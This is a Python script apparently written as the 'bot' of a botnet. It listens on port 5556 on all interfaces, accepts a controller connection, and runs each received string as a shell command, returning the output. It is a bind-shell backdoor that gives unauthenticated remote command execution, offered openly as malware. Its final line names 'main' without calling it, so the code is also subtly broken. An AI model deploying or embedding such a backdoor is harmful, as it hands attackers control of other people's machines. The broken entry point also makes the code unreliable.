
import socket
import subprocess

def main():
    # Create a socket object to listen for commands from the controller
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 5556))  # Bind to any available interface and port 5556
    s.listen(1)  # Listen for incoming connections

    print("Bot listening for commands...")

    # Accept a connection from the controller
    conn, addr = s.accept()
    print(f"Connected to controller from {addr}")

    while True:
        # Receive the command from the controller
        command = conn.recv(1024).decode()
        print("Received command:", command)

        # Execute the command
        output = execute_command(command)

        # Send the output back to the controller
        conn.sendall(output.encode())

def execute_command(command):
    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print("Command output:", result)
        return result
    except subprocess.CalledProcessError as e:
        error_message = "Error executing command: " + e.output
        print(error_message)
        return error_message

if __name__ == "__main__":
    main